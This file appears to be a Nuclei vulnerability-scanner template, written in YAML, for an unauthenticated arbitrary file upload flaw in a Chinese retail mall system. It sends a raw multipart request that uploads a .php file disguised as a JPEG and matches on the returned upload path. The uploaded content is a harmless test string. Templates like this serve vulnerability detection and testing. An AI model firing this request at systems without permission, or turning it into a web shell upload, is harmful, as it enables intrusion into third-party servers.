id: chuangke-shangchuan-upload

info:
  name: 创客13星零售商城系统前台任意文件上传漏洞
  author: chuangke
  severity: high
  tags: chuangke

http:
  - raw:
      - |
        POST /Login/shangchuan HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cache-Control: max-age=0
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg
        Host: {{Hostname}}
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        sec-fetch-user: ?1

        ------WebKitFormBoundaryBP56KuZOdlY4nLGg
        Content-Disposition: form-data; name="file"; filename="secsec.php"
        Content-Type: image/jpeg
        
        testtesss
        ------WebKitFormBoundaryBP56KuZOdlY4nLGg--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"re":"'
          - '/Uploads'
          - '"code":'
        part: body
        condition: and
      - type: status
        status: 
          - 200
